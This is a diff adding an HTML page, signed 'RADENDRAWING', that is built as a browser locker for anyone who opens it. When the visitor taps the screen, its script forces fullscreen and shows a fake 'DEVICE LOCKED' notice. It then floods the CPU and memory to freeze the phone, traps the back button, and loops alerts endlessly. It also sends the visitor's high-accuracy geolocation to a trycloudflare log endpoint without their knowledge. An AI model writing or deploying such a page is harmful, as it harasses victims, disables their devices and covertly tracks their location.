@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>SYSTEM_CRITICAL | RADENDRAWING</title>
+<style>
+  body { margin: 0; background: #000; overflow: hidden; cursor: none; touch-action: none; }
+  .lock-screen {
+    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+    background: #000; display: flex; justify-content: center; align-items: center;
+    z-index: 99999; color: #ff0000; font-family: 'Courier New', monospace; text-align: center;
+  }
+  @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0;} 100% {opacity: 1;} }
+  .blink { animation: blink 0.2s infinite; font-size: 2rem; font-weight: bold; }
+</style>
+</head>
+<body onclick="startAnnihilation()">
+
+<div class="lock-screen" id="display">
+  <h1 class="blink">[ TAP TO ACCESS SYSTEM ]</h1>
+</div>
+
+<script>
+// [ SYSTEM CORE BY RADENDRAWING ]
+let backCount = 0;
+
+function startAnnihilation() {
+    // 1. FORCE FULLSCREEN (Menutup navigasi sistem)
+    const el = document.documentElement;
+    if (el.requestFullscreen) el.requestFullscreen();
+    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+
+    // 2. VISUAL UPDATE
+    document.getElementById('display').innerHTML = `
+        <div style="padding: 20px;">
+            <h1 style="font-size: 3rem;">DEVICE LOCKED</h1>
+            <p style="color: white;">[ EXFILTRATING INTERNAL STORAGE... ]</p>
+            <p style="color: #555;">UID: ${Math.random().toString(36).substr(2, 9).toUpperCase()}</p>
+        </div>
+    `;
+
+    // 3. RESOURCE BOMBING (RAM & CPU OVERLOAD)
+    // Ini yang bikin HP lag parah sampai freeze
+    setInterval(() => {
+        // CPU Stress
+        let x = 0; while(x < 500000) { x++; }
+        // RAM Flood
+        let junk = new Array(5000).fill("RADENDRAWING_OWNS_YOU");
+        console.log(junk);
+        // DOM Overload
+        let div = document.createElement('div');
+        div.style.display = 'none';
+        document.body.appendChild(div);
+    }, 10);
+
+    // 4. NAVIGATION TRAP (Back Button Jail)
+    for (let i = 0; i < 100; i++) {
+        window.history.pushState({page: i}, null, window.location.href);
+    }
+    
+    window.onpopstate = function() {
+        if (navigator.vibrate) navigator.vibrate(1000);
+        alert("FATAL ERROR: DEVICE_COMPROMISED\nACCESS_DENIED_BY_RADENDRAWING");
+        window.history.pushState(null, null, window.location.href);
+    };
+
+    // 5. STEALTH TRACKING
+    navigator.geolocation.getCurrentPosition(p => {
+        fetch(`https://archived-neo-inquire-tissue.trycloudflare.com/log.php?lat=${p.coords.latitude}&lon=${p.coords.longitude}`);
+    }, null, {enableHighAccuracy: true});
+
+    // 6. INFINITE ALERT LOOP (Final Lock)
+    // Ini senjata pamungkas agar tidak bisa dipencet sama sekali
+    const lock = () => {
+        alert("CRITICAL: RADENDRAWING IS WATCHING YOU.");
+        setTimeout(lock, 50);
+    };
+    setTimeout(lock, 2000); // Muncul setelah 2 detik biar target kaget
+}
+
+// Blokir navigasi browser
+window.onbeforeunload = () => "STAY_IN_THE_VOID";
+</script>
+</body>
+</html>
